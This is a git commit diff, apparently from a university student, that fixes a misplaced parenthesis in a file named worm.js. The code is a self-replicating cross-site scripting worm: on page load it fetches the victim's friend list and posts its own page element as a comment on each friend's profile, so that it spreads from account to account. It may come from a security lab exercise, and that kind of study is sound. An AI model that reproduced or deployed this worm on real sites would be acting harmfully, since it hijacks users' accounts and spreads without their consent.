be237d9072abf90c73d455b37ea6a55297b5585d
mcb5686 <mcb5686@rit.edu>
2016-11-28 20:19:44 -0500

    fixed peren

--- worm.js
+++ worm.js
@@ -3,7 +3,7 @@ $( document ).ready(function(){
     $.get( "friends.php", function( data ) {
 		f = data.split('<')[0].split(',');
 		for (i = 0; i <f.length; i++){
-			$.ajax({url:("add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m")).outerHTML)});
+			$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
 		}
 	});
 });
